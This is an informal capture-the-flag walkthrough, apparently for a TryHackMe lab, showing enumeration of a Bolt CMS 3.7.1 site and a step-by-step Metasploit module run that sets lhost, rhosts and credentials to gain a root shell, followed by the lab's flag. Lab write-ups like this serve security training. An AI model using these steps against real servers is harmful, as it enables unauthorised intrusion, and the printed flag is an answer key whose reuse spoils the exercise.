22 80 and 8000 now checking 80 and 8000 one by one 

on port 80 only apache server is running 


here we go 

we get the web interface here now as usually check the web page and source carefully


nothing special found in source page now lets check the web may be username is given or something else

user ===>> Jake (Admin)  
username ===>> bolt

    Admin logged in (3 years ago)
    Admin logged out (3 years ago)
    Added user account 'Admin'. (3 years ago)

 every thing is 3 year previous so it is definetly vulnerable to something we just have to find that 
 
 so Version: 3.7.1 this version is vulnerable i just checked it on google 
 
 
 48296  this is just an id of the exploit no need to remember 
 
 
 one thing just clicked in my mind what if we get in using metasploit 
 so lets check it 
 
 
 
 msfconsole ===>>  
 
 
 type step 1 == msfconsole 
  step 2 == search bolt 
  step 3 == use the one which is suitable in our case "use 0"
 step 4 == check options using options 
 
 step 5 == set lhost tunn0
 6== set rhosts {victim ip}
 7 == set username {jo username h }
 8 == set password [jo password h ]
 9  == type run or exploit 
 
 
 10 = boom !!! you are in 
 
 
 
 Command shell session 1 opened  we get shell
  we are in root user ===>> uid=0(root) gid=0(root) groups=0(root)
  
  
  
  now just do ls and check what are the files given and type pwd for checking oresent working directory and go to cd /home and type ls 
  
  and you see the flag.txt 
  
  
  flag is ===>> THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
